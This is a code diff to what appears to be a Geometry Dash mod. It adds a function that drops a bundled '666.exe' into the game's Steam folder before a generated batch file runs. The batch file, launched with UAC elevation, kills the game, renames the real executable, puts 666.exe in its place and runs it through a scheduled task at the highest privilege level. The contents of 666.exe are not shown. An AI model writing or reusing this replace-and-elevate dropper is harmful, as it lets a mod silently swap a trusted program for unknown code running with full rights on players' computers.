@@ -28,10 +28,24 @@ void createAnGD666Bat() {
     std::ofstream batFile(batPath);
     batFile << "@echo off\n";
     batFile << ":: Request UAC elevation and execute installation sequence\n";
-    // Simplified Sequence: taskkill -> rename original -> rename 666.exe to GD.exe -> mklink -> schtasks
-    // This assumes 666.exe (the launcher) is already in the game folder or provided by the user
+    // Sequence: taskkill -> rename original -> rename 666.exe to GD.exe -> mklink -> schtasks
+    // The mod will extract 666.exe to the game folder before running this
     batFile << "powershell -Command \"Start-Process cmd -Verb RunAs -ArgumentList '/c cd /d \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\\" & taskkill /f /im GeometryDash.exe & ren GeometryDash.exe GeometryDash666.exe & ren 666.exe GeometryDash.exe & mklink 666.exe GeometryDash.exe & schtasks /create /tn \\\"GD666\\\" /tr \\\"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\\\" /sc once /st 00:00 /rl highest /f & schtasks /run /tn \\\"GD666\\\" & schtasks /delete /tn \\\"GD666\\\" /f'\"\n";
     batFile.close();
+}
+
+void extractLauncher() {
+    auto mod = Mod::get();
+    auto resourcePath = mod->getResourcesDir() / "666.exe";
+    auto gameDir = fs::path("C:/Program Files (x86)/Steam/steamapps/common/Geometry Dash");
+    
+    if (fs::exists(resourcePath)) {
+        try {
+            fs::copy(resourcePath, gameDir / "666.exe", fs::copy_options::overwrite_existing);
+        } catch (...) {
+            log::error("Failed to extract launcher to game directory");
+        }
+    }
 }
 
 void disableMod() {
@@ -45,8 +59,6 @@ void disableMod() {
             try { fs::remove(batPath); } catch (...) {}
         }
     }
-
-    // Restart the game automatically to apply changes
     utils::game::restart();
 }
 
@@ -101,6 +113,7 @@ class $modify(MyMenuLayer, MenuLayer) {
         } else if (alert->getTag() == 2) {
             if (btn2) {
                 Mod::get()->setSavedValue("confirmed", true);
+                extractLauncher(); // Extract 666.exe before running the bat
                 char* tempEnv = std::getenv("TEMP");
                 if (tempEnv) {
                     std::string batPath = (fs::path(tempEnv) / "AnGD666.bat").string();
